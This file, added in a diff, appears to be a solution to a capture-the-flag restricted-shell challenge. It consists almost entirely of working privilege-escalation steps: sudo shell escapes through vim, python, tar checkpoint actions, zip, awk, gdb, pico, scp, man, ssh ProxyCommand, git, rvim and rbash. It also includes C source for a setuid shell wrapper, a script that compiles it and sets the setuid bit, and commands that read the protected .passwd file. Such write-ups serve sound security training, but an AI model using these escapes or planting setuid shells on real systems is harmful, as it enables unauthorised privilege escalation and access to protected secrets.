@@ -1,0 +1,68 @@
+# Get the validation password in the file .passwd.
+
+# Your goal is to escalate users one by one using the available commands, up to the app-script-ch14-14 user which will have the rights to read the .passwd file.
+
+# sudo -l
+
+vim -> :set shell=/bin/bash -> :shell (ENTER) -> export PATH=/usr/bin:/bin
+sudo -u app-script-ch14-2 /usr/bin/python -c "import os; os.system('/bin/bash')"
+sudo -u app-script-ch14-3 tar cf /dev/null somefile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo -u app-script-ch14-4 zip /tmp/bla.zip /tmp/bl -T --unzip-command="sh -c /bin/bash"
+sudo -u app-script-ch14-5 awk 'BEGIN{system("bash")}'
+sudo -u app-script-ch14-6 gdb -q
+(gdb) !/bin/bash
+sudo -u app-script-ch14-7 pico -s "/bin/bash" # write /bin/bash and press CTRL-T
+sudo -u app-script-ch14-8 scp -S /tmp/dsds.sh x:y ./ # [1]
+sudo -u app-script-ch14-9 man man # write !/bin/bash and press ENTER
+sudo -u app-script-ch14-10 ssh -o ProxyCommand="sh -c /tmp/sdsd.sh" 127.0.0.1 # [1]
+sudo -u app-script-ch14-11 git help status # write !/bin/bash and press ENTER
+sudo -u app-script-ch14-12 rvim # write :python import os; os.system("/bin/asas.sh") and press ENTER [1]
+sudo -u app-script-ch14-13 script script.sh [1]
+sudo -u app-script-ch14-14 rbash -- # [2]
+app-script-ch14-14@challenge02:~/step14$ mapfile ARRAY < ../.passwd ARRAY
+app-script-ch14-14@challenge02:~/step14$ echo $ARRAY
+
+
+[1] use setuid shell
+app-script-ch14-7@challenge02:/tmp$ cat lala.c
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+int main(int argc, char **argv, char **envp)
+{
+    setresgid(getegid(), getegid(), getegid());
+    setresuid(geteuid(), geteuid(), geteuid());
+
+    execve("/bin/sh", argv,  envp);
+    return 0;
+
+}
+
+app-script-ch14-7@challenge02:/tmp$ cat dsds.sh
+
+#!/bin/bash
+gcc lala.c -o lala
+chmod 777 lala
+chmod +s lala
+app-script-ch14-7@challenge02:/tmp$ chmod +x dsds.sh
+app-script-ch14-7@challenge02:/tmp$ ls -lshrt lala
+8.0K -rwsrwsrwx 1 app-script-ch14-8 app-script-ch14 7.2K Mar 14 20:47 lala
+app-script-ch14-7@challenge02:/tmp$ sudo -u app-script-ch14-8 scp -S /tmp/dsds.sh x:y ./
+app-script-ch14-7@challenge02:/tmp$ ./lala
+           ======================
+           || Restricted shell ||
+      ================================
+       ||     ||<(.)>||<(.)>||     ||
+       ||    _||     ||     ||_    ||
+       ||   (__D     ||     C__)   ||
+       ||   (__D     ||     C__)   ||
+       ||   (__D     ||     C__)   ||
+       ||   (__D     ||     C__)   ||
+       ||     ||     ||     ||     ||
+      ================================
+ * Don't forget to check 'sudo -l' for all steps.
+ * No output network access authorized.
+ * Keep your commands on hand ;)
+
+app-script-ch14-8@challenge02:/tmp$
